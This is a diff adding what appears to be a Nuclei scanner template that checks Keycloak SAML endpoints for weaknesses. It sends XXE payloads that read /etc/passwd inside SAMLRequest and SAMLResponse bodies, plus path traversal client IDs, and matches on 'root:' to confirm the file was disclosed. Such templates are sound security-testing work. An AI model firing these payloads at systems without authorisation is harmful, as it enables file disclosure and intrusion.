@@ -1,0 +1,198 @@
+# Keycloak SAML Vulnerabilities
+# Tests for SAML-specific security vulnerabilities
+
+id: keycloak-saml-vulnerabilities
+
+info:
+  name: Keycloak SAML Security Issues
+  author: H1/rfs85
+  severity: medium
+  description: Tests for SAML-specific vulnerabilities in Keycloak
+  reference:
+    - https://www.keycloak.org/docs/latest/securing_apps/index.html#saml
+    - https://owasp.org/www-community/vulnerabilities/XML_Signature_Wrapping_Attacks
+  tags: keycloak,saml,xml,vulnerability
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/auth/realms/{{realm}}/protocol/saml/descriptor"
+      - "{{BaseURL}}/realms/{{realm}}/protocol/saml/descriptor"
+      - "{{BaseURL}}/auth/realms/{{realm}}/broker/{{idp}}/endpoint/descriptor"
+      - "{{BaseURL}}/realms/{{realm}}/broker/{{idp}}/endpoint/descriptor"
+
+    payloads:
+      realm:
+        - "master"
+        - "saml"
+        - "external"
+        - "federation"
+      idp:
+        - "saml"
+        - "external-saml"
+        - "idp"
+
+    attack: pitchfork
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "EntityDescriptor"
+          - "SPSSODescriptor"
+          - "IDPSSODescriptor"
+        condition: or
+
+      - type: word
+        part: header
+        words:
+          - "application/xml"
+          - "text/xml"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        name: saml_endpoints
+        part: body
+        regex:
+          - "Location=\"([^\"]*)\""
+          - "Binding=\"([^\"]*)\""
+
+      - type: regex
+        name: certificates
+        part: body
+        regex:
+          - "<ds:X509Certificate>([^<]+)</ds:X509Certificate>"
+
+      - type: regex
+        name: entity_id
+        part: body
+        regex:
+          - "entityID=\"([^\"]*)\""
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/auth/realms/{{realm}}/protocol/saml"
+      - "{{BaseURL}}/realms/{{realm}}/protocol/saml"
+
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+
+    body: |
+      SAMLRequest={{saml_request}}
+
+    payloads:
+      realm:
+        - "master"
+        - "saml"
+      saml_request:
+        - "PHNhbWxwOkF1dGhuUmVxdWVzdA=="  # Base64 minimal SAML request
+        - "PD94bWwgdmVyc2lvbj0iMS4wIj8+PHNhbWxwOkF1dGhuUmVxdWVzdA=="
+        - "<!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><samlp:AuthnRequest>&xxe;</samlp:AuthnRequest>"
+
+    attack: pitchfork
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "SAMLResponse"
+          - "AuthnRequest"
+          - "XML"
+        condition: or
+
+      - type: regex
+        part: body
+        regex:
+          - "root:.*?/bin/"
+          - "XML.*error"
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/auth/realms/{{realm}}/protocol/saml/clients/{{client_id}}"
+      - "{{BaseURL}}/realms/{{realm}}/protocol/saml/clients/{{client_id}}"
+
+    payloads:
+      realm:
+        - "master"
+        - "saml"
+      client_id:
+        - "test"
+        - "saml-client"
+        - "sp"
+        - "../../../admin"
+        - "../../.."
+
+    attack: pitchfork
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "client"
+          - "metadata"
+          - "descriptor"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        name: client_info
+        part: body
+        regex:
+          - "clientId[\"']?:\\s*[\"']([^\"']+)"
+          - "name[\"']?:\\s*[\"']([^\"']+)"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/auth/realms/{{realm}}/broker/{{idp}}/endpoint"
+      - "{{BaseURL}}/realms/{{realm}}/broker/{{idp}}/endpoint"
+
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+
+    body: |
+      SAMLResponse={{saml_response}}
+
+    payloads:
+      realm:
+        - "master"
+        - "saml"
+      idp:
+        - "saml"
+        - "external-saml"
+      saml_response:
+        - "PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPFJlZXNwb25zZQ=="
+        - "<!DOCTYPE Response [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><Response>&xxe;</Response>"
+
+    attack: pitchfork
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "XML parsing error"
+          - "SAML"
+        condition: or
+
+      - type: status
+        status:
+          - 400
+          - 500
+
+    extractors:
+      - type: regex
+        name: xxe_content
+        part: body
+        regex:
+          - "(root:.*)"
+          - "(XML.*error.*)"
